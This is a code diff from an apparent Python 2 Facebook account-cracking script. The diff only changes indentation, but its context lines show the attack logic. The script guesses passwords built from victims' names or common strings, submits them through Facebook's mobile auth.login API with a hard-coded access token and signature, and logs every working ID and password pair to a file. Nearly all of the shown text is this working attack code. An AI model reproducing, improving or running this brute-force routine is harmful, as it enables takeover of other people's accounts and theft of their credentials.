@@ -491,7 +491,7 @@ def pilih_super():
 				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
 				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
 				oks.append(user+pass1)
-	      print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
+	                  print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
                         else:
 			        if 'www.facebook.com' in q["error_msg"]:
 				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid_CP'
@@ -502,7 +502,7 @@ def pilih_super():
 				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 				    cek.close()
 				    cekpoint.append(user+pass1)
-			   print  """\033[1;91m╰┻✪✪╧──────────────────────────────➛➢"""
+			          print  """\033[1;91m╰┻✪✪╧──────────────────────────────➛➢"""
                                 else:
 				    pass2 = b['first_name'] + '12345'										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -526,7 +526,7 @@ def pilih_super():
 				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 				               cek.close()
 				               cekpoint.append(user+pass2)
-                          print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""								
+                                             print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""								
 				           else:											
 					       pass3 = b['last_name']+'123'										
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
@@ -550,7 +550,7 @@ def pilih_super():
 				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 				                           cek.close()
 				                           cekpoint.append(user+pass3)
-                                      print  """\033[1;93m╰┻✪✪╧──────────────────────────────➛➢"""									
+                                                         print  """\033[1;93m╰┻✪✪╧──────────────────────────────➛➢"""									
 					               else:										
 						           pass4 = b['last_name'] + '12345'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -574,7 +574,7 @@ def pilih_super():
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)
-                                                  print  """\033[1;94m╰┻✪✪╧──────────────────────────────➛➢"""					
+                                                                     print  """\033[1;94m╰┻✪✪╧──────────────────────────────➛➢"""					
 					                           else:									
 						                       pass5 = b['first_name'] + '123456'										
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
@@ -587,7 +587,7 @@ def pilih_super():
 						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
 						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
 						                               oks.append(user+pass5)
-                                                 print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""	
+                                                                         print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""	
                                                                        else:
 			                                                       if 'www.facebook.com' in q["error_msg"]:
 				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid_CP'
@@ -598,7 +598,7 @@ def pilih_super():
 				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)
-                                                              print  """\033[1;95m╰┻✪✪╧──────────────────────────────➛➢"""					
+                                                                                 print  """\033[1;95m╰┻✪✪╧──────────────────────────────➛➢"""					
 						                               else:								
 							                           pass6 = 'Pakistan'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -622,7 +622,7 @@ def pilih_super():
 				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)
-                                                                          print  """\033[1;96m╰┻✪✪╧──────────────────────────────➛➢"""	
+                                                                                             print  """\033[1;96m╰┻✪✪╧──────────────────────────────➛➢"""	
 						                                           else:							
 								                               pass7 = b('786786')					
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
@@ -648,7 +648,7 @@ def pilih_super():
 				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)
-                                                                                      print  """\033[1;97m╰┻✪✪╧──────────────────────────────➛➢"""           					
+                                                                                                         print  """\033[1;97m╰┻✪✪╧──────────────────────────────➛➢"""           					
 								                                       else:						
 										                           pass8 = b['first_name']+'786'									
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -672,7 +672,7 @@ def pilih_super():
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)
-                                                                                                  print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""   	
+                                                                                                                     print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""   	
 										                                   else:					
 										                                       pass9 = b['first_name'] + b['last_name']					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
@@ -696,7 +696,7 @@ def pilih_super():
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)
-                                                                                                              print  """\033[1;97m╰┻✪✪╧──────────────────────────────➛➢"""	
+                                                                                                                         print  """\033[1;97m╰┻✪✪╧──────────────────────────────➛➢"""	
 																												   	
 											                               
 		except:
